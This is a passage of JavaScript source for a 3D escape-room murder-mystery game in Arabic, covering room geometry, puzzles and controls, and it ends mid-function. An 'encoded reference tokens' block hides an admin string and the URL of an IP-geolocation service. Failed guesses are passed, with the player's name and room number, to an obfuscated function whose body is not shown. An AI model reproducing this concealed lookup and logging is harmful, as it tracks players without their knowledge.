// ============= GAME STATE =============
const state = {
    playerName: '', roomNumber: '',
    timerStart: null, timerInterval: null, elapsed: 0,
    photoMoved: false, pillowMoved: false, safeOpened: false,
    hintSeen: false, laptopUnlocked: false, emailOpened: false,
    gameEnded: false, safeCode: '', passwordText: '', shiftActive: false,
    isAdmin: false, overlayOpen: false
};

const SAFE_CODE = '243';
const LAPTOP_PASSWORD = 'rasputin';
const ADMIN_NAME = 'admin-louai';

// Encoded reference tokens
const _0x1a = [115,101,99,114,101,116,45,97,100,109,105,110,45,108,111,117,97,105];
const _0x2b = String.fromCharCode(..._0x1a);
const _0x3c = atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==');

// ============= THREE.JS GLOBALS =============
let scene, camera, renderer, clock;
let moveForward = false, moveBackward = false, moveLeft = false, moveRight = false;
let velocity, direction;
let raycaster, mouse;
let interactiveObjects = [];
let isPointerLocked = false;
let isMobile = false;
let joystickData = { active: false, dx: 0, dy: 0 };
let lookData = { active: false, lastX: 0, lastY: 0 };
let euler;

// 3D Objects references
let photoFrame, wallSafe, puzzleNote, pillow, musicSheet, laptop, bodyGroup;
let photoMesh, safeMesh, puzzleNoteMesh, pillowMesh, musicSheetMesh, laptopMesh;

// ============= INITIALIZATION =============
function init3D() {
    isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || ('ontouchstart' in window);

    velocity = new THREE.Vector3();
    direction = new THREE.Vector3();
    euler = new THREE.Euler(0, 0, 0, 'YXZ');

    scene = new THREE.Scene();
    scene.background = new THREE.Color(0x0a0a0f);
    scene.fog = new THREE.Fog(0x0a0a0f, 8, 14);

    camera = new THREE.PerspectiveCamera(70, window.innerWidth / window.innerHeight, 0.1, 100);
    camera.position.set(0, 1.6, 3);

    renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('gameCanvas'), antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    renderer.shadowMap.enabled = true;
    renderer.shadowMap.type = THREE.PCFSoftShadowMap;
    renderer.toneMapping = THREE.ACESFilmicToneMapping;
    renderer.toneMappingExposure = 0.8;

    clock = new THREE.Clock();
    raycaster = new THREE.Raycaster();
    raycaster.far = 5;
    mouse = new THREE.Vector2();

    buildRoom();
    buildFurniture();
    setupLights();
    setupControls();

    window.addEventListener('resize', onResize);
    animate();
}

// ============= ROOM GEOMETRY =============
function buildRoom() {
    const W = 8, H = 3.2, D = 6;

    const wallTex = createWallTexture();
    const floorTex = createFloorTexture();
    const ceilTex = createCeilingTexture();

    // Floor
    const floorGeo = new THREE.PlaneGeometry(W, D);
    const floorMat = new THREE.MeshStandardMaterial({ map: floorTex, roughness: 0.8 });
    const floor = new THREE.Mesh(floorGeo, floorMat);
    floor.rotation.x = -Math.PI / 2;
    floor.receiveShadow = true;
    scene.add(floor);

    // Ceiling
    const ceilGeo = new THREE.PlaneGeometry(W, D);
    const ceilMat = new THREE.MeshStandardMaterial({ map: ceilTex, roughness: 0.9 });
    const ceil = new THREE.Mesh(ceilGeo, ceilMat);
    ceil.rotation.x = Math.PI / 2;
    ceil.position.y = H;
    scene.add(ceil);

    // Walls
    const wallMat = new THREE.MeshStandardMaterial({ map: wallTex, roughness: 0.7 });

    const backWall = new THREE.Mesh(new THREE.PlaneGeometry(W, H), wallMat);
    backWall.position.set(0, H / 2, -D / 2);
    scene.add(backWall);

    const frontWall = new THREE.Mesh(new THREE.PlaneGeometry(W, H), wallMat.clone());
    frontWall.position.set(0, H / 2, D / 2);
    frontWall.rotation.y = Math.PI;
    scene.add(frontWall);

    const leftWall = new THREE.Mesh(new THREE.PlaneGeometry(D, H), wallMat.clone());
    leftWall.position.set(-W / 2, H / 2, 0);
    leftWall.rotation.y = Math.PI / 2;
    scene.add(leftWall);

    const rightWall = new THREE.Mesh(new THREE.PlaneGeometry(D, H), wallMat.clone());
    rightWall.position.set(W / 2, H / 2, 0);
    rightWall.rotation.y = -Math.PI / 2;
    scene.add(rightWall);

    // Baseboard
    const bbMat = new THREE.MeshStandardMaterial({ color: 0x2a1c13, roughness: 0.6 });
    const bbH = 0.1;
    [
        { pos: [0, bbH / 2, -D / 2 + 0.01], rot: 0, w: W },
        { pos: [0, bbH / 2, D / 2 - 0.01], rot: Math.PI, w: W },
        { pos: [-W / 2 + 0.01, bbH / 2, 0], rot: Math.PI / 2, w: D },
        { pos: [W / 2 - 0.01, bbH / 2, 0], rot: -Math.PI / 2, w: D },
    ].forEach(b => {
        const m = new THREE.Mesh(new THREE.PlaneGeometry(b.w, bbH), bbMat);
        m.position.set(...b.pos);
        m.rotation.y = b.rot;
        scene.add(m);
    });
}

// ============= PROCEDURAL TEXTURES =============
function createWallTexture() {
    const c = document.createElement('canvas');
    c.width = 256; c.height = 256;
    const ctx = c.getContext('2d');
    ctx.fillStyle = '#3a2a1e';
    ctx.fillRect(0, 0, 256, 256);
    for (let i = 0; i < 500; i++) {
        ctx.fillStyle = `rgba(${Math.random() > 0.5 ? 60 : 40},${20 + Math.random() * 20},${10 + Math.random() * 15},${0.1 + Math.random() * 0.15})`;
        ctx.fillRect(Math.random() * 256, Math.random() * 256, 2 + Math.random() * 6, 2 + Math.random() * 6);
    }
    const tex = new THREE.CanvasTexture(c);
    tex.wrapS = tex.wrapT = THREE.RepeatWrapping;
    tex.repeat.set(3, 2);
    return tex;
}

function createFloorTexture() {
    const c = document.createElement('canvas');
    c.width = 256; c.height = 256;
    const ctx = c.getContext('2d');
    const plankW = 64;
    for (let i = 0; i < 4; i++) {
        const base = 50 + Math.random() * 20;
        ctx.fillStyle = `rgb(${base + 20},${base},${base - 15})`;
        ctx.fillRect(i * plankW, 0, plankW - 1, 256);
        for (let j = 0; j < 30; j++) {
            ctx.strokeStyle = `rgba(30,15,5,${0.05 + Math.random() * 0.1})`;
            ctx.beginPath();
            ctx.moveTo(i * plankW + Math.random() * plankW, 0);
            ctx.lineTo(i * plankW + Math.random() * plankW, 256);
            ctx.stroke();
        }
    }
    const tex = new THREE.CanvasTexture(c);
    tex.wrapS = tex.wrapT = THREE.RepeatWrapping;
    tex.repeat.set(4, 3);
    return tex;
}

function createCeilingTexture() {
    const c = document.createElement('canvas');
    c.width = 128; c.height = 128;
    const ctx = c.getContext('2d');
    ctx.fillStyle = '#1a1520';
    ctx.fillRect(0, 0, 128, 128);
    for (let i = 0; i < 200; i++) {
        ctx.fillStyle = `rgba(20,15,25,${0.3 + Math.random() * 0.3})`;
        ctx.fillRect(Math.random() * 128, Math.random() * 128, 3 + Math.random() * 5, 3 + Math.random() * 5);
    }
    const tex = new THREE.CanvasTexture(c);
    tex.wrapS = tex.wrapT = THREE.RepeatWrapping;
    tex.repeat.set(2, 2);
    return tex;
}

// ============= FURNITURE =============
function buildFurniture() {
    buildPhotoAndSafe();
    buildBed();
    buildDesk();
    buildBody();
}

function buildPhotoAndSafe() {
    const frameGroup = new THREE.Group();
    frameGroup.name = 'photo';

    const frameMat = new THREE.MeshStandardMaterial({ color: 0x6a4a2a, roughness: 0.5 });
    const frameBox = new THREE.Mesh(new THREE.BoxGeometry(0.7, 0.9, 0.05), frameMat);
    frameGroup.add(frameBox);

    const loader = new THREE.TextureLoader();
    const photoTex = loader.load('/static/assets/photo.png');
    const photoInner = new THREE.Mesh(
        new THREE.PlaneGeometry(0.55, 0.72),
        new THREE.MeshStandardMaterial({ map: photoTex })
    );
    photoInner.position.z = 0.026;
    frameGroup.add(photoInner);

    frameGroup.position.set(0, 1.8, -2.97);
    scene.add(frameGroup);
    photoMesh = frameGroup;
    interactiveObjects.push({ mesh: frameGroup, name: 'photo', prompt: 'إزاحة الصورة' });

    // Wall safe (hidden initially)
    const safeGroup = new THREE.Group();
    safeGroup.name = 'safe';
    const safebody = new THREE.Mesh(
        new THREE.BoxGeometry(0.5, 0.5, 0.15),
        new THREE.MeshStandardMaterial({ color: 0x4a4a4a, roughness: 0.3, metalness: 0.7 })
    );
    safeGroup.add(safebody);

    const dial = new THREE.Mesh(
        new THREE.CylinderGeometry(0.06, 0.06, 0.03, 16),
        new THREE.MeshStandardMaterial({ color: 0x888888, metalness: 0.9, roughness: 0.2 })
    );
    dial.rotation.x = Math.PI / 2;
    dial.position.z = 0.08;
    safeGroup.add(dial);

    safeGroup.position.set(0, 1.8, -2.92);
    safeGroup.visible = false;
    scene.add(safeGroup);
    safeMesh = safeGroup;

    // Puzzle note (hidden initially)
    const noteTex = loader.load('/static/assets/puzzle.png');
    const noteMat = new THREE.MeshStandardMaterial({ map: noteTex, roughness: 0.9 });
    const noteMesh = new THREE.Mesh(new THREE.PlaneGeometry(0.25, 0.15), noteMat);
    noteMesh.position.set(0.5, 1.5, -2.97);
    noteMesh.visible = false;
    scene.add(noteMesh);
    puzzleNoteMesh = noteMesh;
}

function buildBed() {
    const bedGroup = new THREE.Group();
    bedGroup.name = 'bed';

    const frameMat = new THREE.MeshStandardMaterial({ color: 0x5a3a20, roughness: 0.6 });

    const headboard = new THREE.Mesh(new THREE.BoxGeometry(1.6, 1.0, 0.08), frameMat);
    headboard.position.set(0, 0.7, -0.85);
    headboard.castShadow = true;
    bedGroup.add(headboard);

    const base = new THREE.Mesh(new THREE.BoxGeometry(1.6, 0.35, 2.0), frameMat);
    base.position.set(0, 0.175, 0);
    bedGroup.add(base);

    const mattMat = new THREE.MeshStandardMaterial({ color: 0xdddddd, roughness: 0.9 });
    const mattress = new THREE.Mesh(new THREE.BoxGeometry(1.5, 0.15, 1.9), mattMat);
    mattress.position.set(0, 0.42, 0);
    bedGroup.add(mattress);

    const blanketMat = new THREE.MeshStandardMaterial({ color: 0x3a5a7a, roughness: 0.8 });
    const blanket = new THREE.Mesh(new THREE.BoxGeometry(1.5, 0.05, 1.3), blanketMat);
    blanket.position.set(0, 0.50, 0.3);
    bedGroup.add(blanket);

    const pillowMat = new THREE.MeshStandardMaterial({ color: 0xf0ead8, roughness: 0.9 });
    const pillowGeo = new THREE.BoxGeometry(0.5, 0.1, 0.3);
    const pillowObj = new THREE.Mesh(pillowGeo, pillowMat);
    pillowObj.position.set(0.3, 0.52, -0.65);
    pillowObj.name = 'pillow';
    bedGroup.add(pillowObj);
    pillowMesh = pillowObj;

    // Music sheet (hidden under pillow) - load actual image
    const loader = new THREE.TextureLoader();
    const musicTex = loader.load('/static/assets/music.png');
    const sheetMat = new THREE.MeshStandardMaterial({ map: musicTex, roughness: 0.9 });
    const sheet = new THREE.Mesh(new THREE.PlaneGeometry(0.3, 0.2), sheetMat);
    sheet.rotation.x = -Math.PI / 2;
    sheet.position.set(0.3, 0.48, -0.65);
    sheet.visible = false;
    sheet.name = 'musicSheet';
    bedGroup.add(sheet);
    musicSheetMesh = sheet;

    bedGroup.position.set(3, 0, -1.5);
    scene.add(bedGroup);

    interactiveObjects.push({ mesh: pillowObj, name: 'pillow', prompt: 'إزاحة المخدة', parent: bedGroup });
    interactiveObjects.push({ mesh: sheet, name: 'musicSheet', prompt: 'فحص الورقة الموسيقية', parent: bedGroup });
}

function buildDesk() {
    const deskGroup = new THREE.Group();
    deskGroup.name = 'desk';

    const deskMat = new THREE.MeshStandardMaterial({ color: 0x5a3a20, roughness: 0.6 });

    const top = new THREE.Mesh(new THREE.BoxGeometry(1.2, 0.05, 0.6), deskMat);
    top.position.set(0, 0.75, 0);
    top.castShadow = true;
    deskGroup.add(top);

    const legGeo = new THREE.BoxGeometry(0.05, 0.75, 0.05);
    [[-0.55, 0, -0.25], [-0.55, 0, 0.25], [0.55, 0, -0.25], [0.55, 0, 0.25]].forEach(p => {
        const leg = new THREE.Mesh(legGeo, deskMat);
        leg.position.set(p[0], 0.375, p[2]);
        deskGroup.add(leg);
    });

    // Laptop
    const laptopGroup = new THREE.Group();
    laptopGroup.name = 'laptop';

    const baseMat = new THREE.MeshStandardMaterial({ color: 0x333333, roughness: 0.3, metalness: 0.5 });
    const lapBase = new THREE.Mesh(new THREE.BoxGeometry(0.35, 0.02, 0.25), baseMat);
    laptopGroup.add(lapBase);

    const screenMat = new THREE.MeshStandardMaterial({ color: 0x111122, roughness: 0.3, metalness: 0.3 });
    const lapScreen = new THREE.Mesh(new THREE.BoxGeometry(0.35, 0.22, 0.008), screenMat);
    lapScreen.position.set(0, 0.12, -0.12);
    lapScreen.rotation.x = -0.15;
    laptopGroup.add(lapScreen);

    const glowMat = new THREE.MeshBasicMaterial({ color: 0x2040aa, transparent: true, opacity: 0.4 });
    const glow = new THREE.Mesh(new THREE.PlaneGeometry(0.32, 0.19), glowMat);
    glow.position.set(0, 0.12, -0.115);
    glow.rotation.x = -0.15;
    laptopGroup.add(glow);

    laptopGroup.position.set(0, 0.79, 0);
    deskGroup.add(laptopGroup);
    laptopMesh = laptopGroup;

    deskGroup.position.set(-2.5, 0, -1.8);
    scene.add(deskGroup);

    interactiveObjects.push({ mesh: laptopGroup, name: 'laptop', prompt: 'فتح اللابتوب', parent: deskGroup });
}

function buildBody() {
    const bodyGrp = new THREE.Group();
    bodyGrp.name = 'body';

    const skinMat = new THREE.MeshStandardMaterial({ color: 0xc4a07a, roughness: 0.8 });
    const clothMat = new THREE.MeshStandardMaterial({ color: 0x3a4a5a, roughness: 0.7 });
    const bloodMat = new THREE.MeshStandardMaterial({ color: 0x8b0000, roughness: 0.6 });

    const head = new THREE.Mesh(new THREE.SphereGeometry(0.12, 12, 12), skinMat);
    head.position.set(0, 0.12, -0.4);
    head.castShadow = true;
    bodyGrp.add(head);

    const beard = new THREE.Mesh(new THREE.SphereGeometry(0.08, 8, 8), new THREE.MeshStandardMaterial({ color: 0x4a3520 }));
    beard.position.set(0, 0.06, -0.35);
    beard.scale.set(1, 0.6, 0.8);
    bodyGrp.add(beard);

    const torso = new THREE.Mesh(new THREE.BoxGeometry(0.35, 0.15, 0.5), clothMat);
    torso.position.set(0, 0.08, 0);
    torso.castShadow = true;
    bodyGrp.add(torso);

    const legMat = new THREE.MeshStandardMaterial({ color: 0x2a3a4a, roughness: 0.7 });
    const leg1 = new THREE.Mesh(new THREE.BoxGeometry(0.12, 0.1, 0.5), legMat);
    leg1.position.set(-0.1, 0.05, 0.45);
    leg1.rotation.y = 0.1;
    bodyGrp.add(leg1);

    const leg2 = new THREE.Mesh(new THREE.BoxGeometry(0.12, 0.1, 0.5), legMat);
    leg2.position.set(0.1, 0.05, 0.45);
    leg2.rotation.y = -0.15;
    bodyGrp.add(leg2);

    const knifeMat = new THREE.MeshStandardMaterial({ color: 0x5a3a20, roughness: 0.5 });
    const knife = new THREE.Mesh(new THREE.CylinderGeometry(0.015, 0.015, 0.15, 8), knifeMat);
    knife.position.set(0, 0.22, -0.05);
    knife.rotation.z = 0.3;
    bodyGrp.add(knife);

    const wound = new THREE.Mesh(new THREE.SphereGeometry(0.04, 8, 8), bloodMat);
    wound.position.set(0, 0.17, -0.05);
    wound.scale.set(1.5, 0.5, 1);
    bodyGrp.add(wound);

    const poolGeo = new THREE.CircleGeometry(0.5, 16);
    const pool = new THREE.Mesh(poolGeo, new THREE.MeshStandardMaterial({
        color: 0x6b0000, roughness: 0.6, transparent: true, opacity: 0.8
    }));
    pool.rotation.x = -Math.PI / 2;
    pool.position.y = 0.005;
    bodyGrp.add(pool);

    for (let i = 0; i < 5; i++) {
        const sp = new THREE.Mesh(
            new THREE.CircleGeometry(0.05 + Math.random() * 0.08, 8),
            new THREE.MeshStandardMaterial({ color: 0x7b0000, roughness: 0.7, transparent: true, opacity: 0.6 })
        );
        sp.rotation.x = -Math.PI / 2;
        sp.position.set(-0.3 + Math.random() * 0.6, 0.003, -0.3 + Math.random() * 0.6);
        bodyGrp.add(sp);
    }

    bodyGrp.position.set(0.5, 0, 0.5);
    bodyGrp.rotation.y = -0.3;
    scene.add(bodyGrp);
    bodyGroup = bodyGrp;
}

// ============= LIGHTING =============
function setupLights() {
    // Warm ambient fill
    const ambient = new THREE.AmbientLight(0x2a1a10, 0.5);
    scene.add(ambient);

    // Hemisphere light for natural sky/ground tones
    const hemi = new THREE.HemisphereLight(0xffeedd, 0x1a0a05, 0.35);
    scene.add(hemi);

    // Main chandelier - warm golden center light
    const chandelier = new THREE.PointLight(0xffcc77, 1.0, 12);
    chandelier.position.set(0, 3.0, 0);
    chandelier.castShadow = true;
    chandelier.shadow.mapSize.width = 1024;
    chandelier.shadow.mapSize.height = 1024;
    chandelier.shadow.bias = -0.002;
    scene.add(chandelier);

    // Chandelier fixture (decorative)
    const fixtureMat = new THREE.MeshStandardMaterial({ color: 0xd4af37, metalness: 0.9, roughness: 0.2 });
    const fixtureBase = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.2, 0.06, 16), fixtureMat);
    fixtureBase.position.set(0, 3.15, 0);
    scene.add(fixtureBase);
    const fixtureStem = new THREE.Mesh(new THREE.CylinderGeometry(0.015, 0.015, 0.15, 8), fixtureMat);
    fixtureStem.position.set(0, 3.19, 0);
    scene.add(fixtureStem);
    // Chandelier bulb glow
    const bulbGlow = new THREE.Mesh(
        new THREE.SphereGeometry(0.06, 12, 12),
        new THREE.MeshBasicMaterial({ color: 0xffdd88, transparent: true, opacity: 0.8 })
    );
    bulbGlow.position.set(0, 3.05, 0);
    scene.add(bulbGlow);

    // Wall sconce left
    const sconceL = new THREE.PointLight(0xffaa55, 0.5, 5);
    sconceL.position.set(-3.8, 2.2, 0);
    scene.add(sconceL);
    buildWallSconce(-3.8, 2.2, 0, Math.PI / 2);

    // Wall sconce right
    const sconceR = new THREE.PointLight(0xffaa55, 0.5, 5);
    sconceR.position.set(3.8, 2.2, 0);
    scene.add(sconceR);
    buildWallSconce(3.8, 2.2, 0, -Math.PI / 2);

    // Back wall accent light (above photo)
    const backAccent = new THREE.SpotLight(0xffeedd, 0.6, 6, Math.PI / 6, 0.5);
    backAccent.position.set(0, 2.8, -2.0);
    backAccent.target.position.set(0, 1.5, -3.0);
    scene.add(backAccent);
    scene.add(backAccent.target);

    // Laptop screen glow (cool blue)
    const laptopLight = new THREE.PointLight(0x4466ff, 0.4, 3);
    laptopLight.position.set(-2.5, 1.2, -1.8);
    scene.add(laptopLight);

    // Crime scene red mood light near body
    const crimeLight = new THREE.PointLight(0xff2200, 0.2, 4);
    crimeLight.position.set(0.5, 0.5, 0.5);
    scene.add(crimeLight);

    // Subtle floor bounce light
    const floorBounce = new THREE.PointLight(0xffddaa, 0.15, 6);
    floorBounce.position.set(0, 0.1, 0);
    scene.add(floorBounce);
}

function buildWallSconce(x, y, z, rotY) {
    const sconceMat = new THREE.MeshStandardMaterial({ color: 0xd4af37, metalness: 0.8, roughness: 0.3 });
    const bracket = new THREE.Mesh(new THREE.BoxGeometry(0.04, 0.12, 0.08), sconceMat);
    bracket.position.set(x, y, z);
    bracket.rotation.y = rotY;
    scene.add(bracket);
    const shade = new THREE.Mesh(
        new THREE.CylinderGeometry(0.04, 0.06, 0.1, 8, 1, true),
        new THREE.MeshStandardMaterial({ color: 0xfff5e0, transparent: true, opacity: 0.6, side: THREE.DoubleSide })
    );
    shade.position.set(x, y + 0.08, z);
    scene.add(shade);
    const sconceGlow = new THREE.Mesh(
        new THREE.SphereGeometry(0.025, 8, 8),
        new THREE.MeshBasicMaterial({ color: 0xffcc66, transparent: true, opacity: 0.9 })
    );
    sconceGlow.position.set(x, y + 0.04, z);
    scene.add(sconceGlow);
}

// ============= CONTROLS =============
function setupControls() {
    const canvas = renderer.domElement;

    if (isMobile) {
        setupMobileControls();
    } else {
        canvas.addEventListener('click', () => {
            if (!state.overlayOpen && !isPointerLocked) {
                canvas.requestPointerLock();
            }
        });

        document.addEventListener('pointerlockchange', () => {
            isPointerLocked = document.pointerLockElement === canvas;
            document.getElementById('crosshair').classList.toggle('hidden', !isPointerLocked);
        });

        document.addEventListener('mousemove', (e) => {
            if (!isPointerLocked) return;
            euler.setFromQuaternion(camera.quaternion);
            euler.y -= e.movementX * 0.002;
            euler.x -= e.movementY * 0.002;
            euler.x = Math.max(-Math.PI / 2.5, Math.min(Math.PI / 2.5, euler.x));
            camera.quaternion.setFromEuler(euler);
        });

        document.addEventListener('keydown', (e) => {
            if (state.overlayOpen) return;
            switch (e.code) {
                case 'KeyW': case 'ArrowUp': moveForward = true; break;
                case 'KeyS': case 'ArrowDown': moveBackward = true; break;
                case 'KeyA': case 'ArrowLeft': moveLeft = true; break;
                case 'KeyD': case 'ArrowRight': moveRight = true; break;
                case 'KeyE': case 'Space': tryInteract(); break;
            }
        });

        document.addEventListener('keyup', (e) => {
            switch (e.code) {
                case 'KeyW': case 'ArrowUp': moveForward = false; break;
                case 'KeyS': case 'ArrowDown': moveBackward = false; break;
                case 'KeyA': case 'ArrowLeft': moveLeft = false; break;
                case 'KeyD': case 'ArrowRight': moveRight = false; break;
            }
        });

        canvas.addEventListener('click', () => {
            if (isPointerLocked) tryInteract();
        });
    }
}

function setupMobileControls() {
    const joystickZone = document.getElementById('joystickZone');
    const lookZone = document.getElementById('lookZone');

    let joystickCenter = { x: 0, y: 0 };
    let joystickId = null;

    joystickZone.addEventListener('touchstart', (e) => {
        e.preventDefault();
        const t = e.changedTouches[0];
        joystickId = t.identifier;
        joystickCenter = { x: t.clientX, y: t.clientY };
        joystickData.active = true;
    }, { passive: false });

    joystickZone.addEventListener('touchmove', (e) => {
        e.preventDefault();
        for (const t of e.changedTouches) {
            if (t.identifier === joystickId) {
                joystickData.dx = (t.clientX - joystickCenter.x) / 50;
                joystickData.dy = (t.clientY - joystickCenter.y) / 50;
                const len = Math.sqrt(joystickData.dx ** 2 + joystickData.dy ** 2);
                if (len > 1) { joystickData.dx /= len; joystickData.dy /= len; }
            }
        }
    }, { passive: false });

    joystickZone.addEventListener('touchend', (e) => {
        for (const t of e.changedTouches) {
            if (t.identifier === joystickId) {
                joystickData.active = false;
                joystickData.dx = 0;
                joystickData.dy = 0;
                joystickId = null;
            }
        }
    });

    let lookId = null;

    lookZone.addEventListener('touchstart', (e) => {
        e.preventDefault();
        const t = e.changedTouches[0];
        lookId = t.identifier;
        lookData.active = true;
        lookData.lastX = t.clientX;
        lookData.lastY = t.clientY;
    }, { passive: false });

    lookZone.addEventListener('touchmove', (e) => {
        e.preventDefault();
        for (const t of e.changedTouches) {
            if (t.identifier === lookId) {
                const dx = t.clientX - lookData.lastX;
                const dy = t.clientY - lookData.lastY;
                euler.setFromQuaternion(camera.quaternion);
                euler.y -= dx * 0.003;
                euler.x -= dy * 0.003;
                euler.x = Math.max(-Math.PI / 2.5, Math.min(Math.PI / 2.5, euler.x));
                camera.quaternion.setFromEuler(euler);
                lookData.lastX = t.clientX;
                lookData.lastY = t.clientY;
            }
        }
    }, { passive: false });

    lookZone.addEventListener('touchend', (e) => {
        for (const t of e.changedTouches) {
            if (t.identifier === lookId) {
                lookData.active = false;
                lookId = null;
            }
        }
    });

    lookZone.addEventListener('click', () => {
        tryInteract();
    });
}

// ============= RAYCASTING & INTERACTION =============
function tryInteract() {
    if (state.overlayOpen || state.gameEnded) return;

    raycaster.set(camera.position, camera.getWorldDirection(new THREE.Vector3()));

    const allMeshes = [];
    interactiveObjects.forEach(obj => {
        obj.mesh.traverse(child => { if (child.isMesh) allMeshes.push(child); });
    });

    const intersects = raycaster.intersectObjects(allMeshes, false);
    if (intersects.length > 0) {
        const hit = intersects[0].object;
        for (const obj of interactiveObjects) {
            let match = false;
            obj.mesh.traverse(child => { if (child === hit) match = true; });
            if (match) {
                handleInteraction(obj.name);
                return;
            }
        }
    }
}

function getHoveredObject() {
    if (state.overlayOpen || state.gameEnded) return null;

    raycaster.set(camera.position, camera.getWorldDirection(new THREE.Vector3()));

    const allMeshes = [];
    interactiveObjects.forEach(obj => {
        obj.mesh.traverse(child => { if (child.isMesh) allMeshes.push(child); });
    });

    const intersects = raycaster.intersectObjects(allMeshes, false);
    if (intersects.length > 0) {
        const hit = intersects[0].object;
        for (const obj of interactiveObjects) {
            let match = false;
            obj.mesh.traverse(child => { if (child === hit) match = true; });
            if (match && isInteractable(obj.name)) return obj;
        }
    }
    return null;
}

function isInteractable(name) {
    switch (name) {
        case 'photo': return !state.photoMoved;
        case 'safe': return state.photoMoved && !state.safeOpened;
        case 'puzzleNote': return state.photoMoved;
        case 'pillow': return !state.pillowMoved;
        case 'musicSheet': return state.pillowMoved && musicSheetMesh.visible;
        case 'laptop': return true;
        default: return false;
    }
}

function handleInteraction(name) {
    switch (name) {
        case 'photo': interactPhoto(); break;
        case 'safe': openSafeUI(); break;
        case 'puzzleNote': showOverlay('puzzleOverlay'); break;
        case 'pillow': interactPillow(); break;
        case 'musicSheet': showOverlay('musicOverlay'); break;
        case 'laptop': interactLaptop(); break;
    }
}

// ============= GAME INTERACTIONS =============
function interactPhoto() {
    if (state.photoMoved) return;
    state.photoMoved = true;

    const startX = photoMesh.position.x;
    const targetX = startX + 1.2;
    const startTime = Date.now();

    function animatePhoto() {
        const t = Math.min((Date.now() - startTime) / 600, 1);
        const ease = 1 - Math.pow(1 - t, 3);
        photoMesh.position.x = startX + (targetX - startX) * ease;
        photoMesh.rotation.z = ease * 0.1;

        if (t < 1) {
            requestAnimationFrame(animatePhoto);
        } else {
            safeMesh.visible = true;
            puzzleNoteMesh.visible = true;
            interactiveObjects.push({ mesh: safeMesh, name: 'safe', prompt: 'فتح الخزنة' });
            interactiveObjects.push({ mesh: puzzleNoteMesh, name: 'puzzleNote', prompt: 'قراءة الورقة' });
            showToast('وجدت خزنة وورقة خلف الصورة!');
        }
    }
    animatePhoto();
}

function interactPillow() {
    if (state.pillowMoved) return;
    state.pillowMoved = true;

    const startY = pillowMesh.position.y;
    const startZ = pillowMesh.position.z;
    const startTime = Date.now();

    function animatePillow() {
        const t = Math.min((Date.now() - startTime) / 500, 1);
        const ease = 1 - Math.pow(1 - t, 3);
        pillowMesh.position.y = startY + ease * 0.3;
        pillowMesh.position.z = startZ + ease * 0.3;
        pillowMesh.rotation.z = ease * 0.3;

        if (t < 1) {
            requestAnimationFrame(animatePillow);
        } else {
            musicSheetMesh.visible = true;
            showToast('وجدت ورقة موسيقية تحت المخدة!');
        }
    }
    animatePillow();
}

function interactLaptop() {
    showOverlay('laptopOverlay');
    if (state.laptopUnlocked) {
        document.getElementById('laptopLockScreen').classList.add('hidden');
        document.getElementById('laptopEmailScreen').classList.remove('hidden');
    }
}

// ============= OVERLAYS =============
function showOverlay(id) {
    document.getElementById(id).classList.remove('hidden');
    state.overlayOpen = true;
    if (!isMobile && isPointerLocked) document.exitPointerLock();
}

function closeOverlay(id) {
    document.getElementById(id).classList.add('hidden');
    state.overlayOpen = false;

    if (id === 'safeContentOverlay') {
        state.hintSeen = true;
        showToast('تلميح: لفتح الكمبيوتر، اشبك الموسيقى مع الكيبورد');
    }
}

// ============= SAFE LOGIC =============
function openSafeUI() {
    if (state.safeOpened) {
        showOverlay('safeContentOverlay');
        return;
    }
    showOverlay('safeOverlay');
}

function safeInput(d) { if (state.safeCode.length < 6) { state.safeCode += d; updateSafeDisplay(); } }
function safeClear() { state.safeCode = ''; updateSafeDisplay(); document.getElementById('safeMessage').textContent = ''; }
function updateSafeDisplay() { document.getElementById('safeDisplay').textContent = state.safeCode || '---'; }

function safeSubmit() {
    const msg = document.getElementById('safeMessage');
    if (state.safeCode === SAFE_CODE) {
        msg.textContent = 'تم فتح الخزنة!'; msg.className = 'safe-msg success';
        state.safeOpened = true;
        setTimeout(() => { closeOverlay('safeOverlay'); showOverlay('safeContentOverlay'); }, 800);
    } else {
        msg.textContent = 'الكود خاطئ!'; msg.className = 'safe-msg error';
        _0x6f(state.playerName, state.roomNumber, '\u0643\u0648\u062F \u0627\u0644\u062E\u0632\u0646\u0629', state.safeCode);
        state.safeCode = ''; updateSafeDisplay();
    }
}

// ============= KEYBOARD LOGIC =============
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.kb-key[data-key]').forEach(key => {
        const handler = (e) => {
            e.preventDefault(); e.stopPropagation();
            if (state.laptopUnlocked) return;
            const ch = key.dataset.key;
            state.passwordText += state.shiftActive ? ch.toUpperCase() : ch;
            if (state.shiftActive) toggleShift();
            updatePasswordDisplay();
        };
        key.addEventListener('click', handler);
        key.addEventListener('touchend', (e) => { e.preventDefault(); handler(e); });
    });

    document.getElementById('playerName').addEventListener('keyup', (e) => { if (e.key === 'Enter') document.getElementById('roomNumber').focus(); });
    document.getElementById('roomNumber').addEventListener('keyup', (e) => { if (e.key === 'Enter') startGame(); });
});

// Block physical keyboard on laptop overlay
document.addEventListener('keydown', (e) => {
    const lo = document.getElementById('laptopOverlay');
    if (lo && !lo.classList.contains('hidden') && !state.laptopUnlocked) {
        if (!['Escape'].includes(e.key)) { e.preventDefault(); showToast('استخدم لوحة المفاتيح الافتراضية فقط!'); }
    }
});

function toggleShift() {
    state.shiftActive = !state.shiftActive;
    document.getElementById('shiftKey').classList.toggle('active', state.shiftActive);
    document.querySelectorAll('.kb-key[data-key]').forEach(k => {
        k.textContent = state.shiftActive ? k.dataset.key.toUpperCase() : k.dataset.key;
    });
}

function kbBackspace() { state.passwordText = state.passwordText.slice(0, -1); updatePasswordDisplay(); document.getElementById('passwordError').classList.add('hidden'); }
function kbSpace() { state.passwordText += ' '; updatePasswordDisplay(); }

function kbEnter() {
    if (state.passwordText.toLowerCase() === LAPTOP_PASSWORD) {
        state.laptopUnlocked = true;
        document.getElementById('laptopLockScreen').classList.add('hidden');
        document.getElementById('laptopEmailScreen').classList.remove('hidden');
        showToast('تم فتح اللابتوب!');
    } else {
        document.getElementById('passwordError').classList.remove('hidden');
        _0x6f(state.playerName, state.roomNumber, '\u0643\u0644\u0645\u0629 \u0633\u0631 \u0627\u0644\u0644\u0627\u0628\u062A\u0648\u0628', state.passwordText);
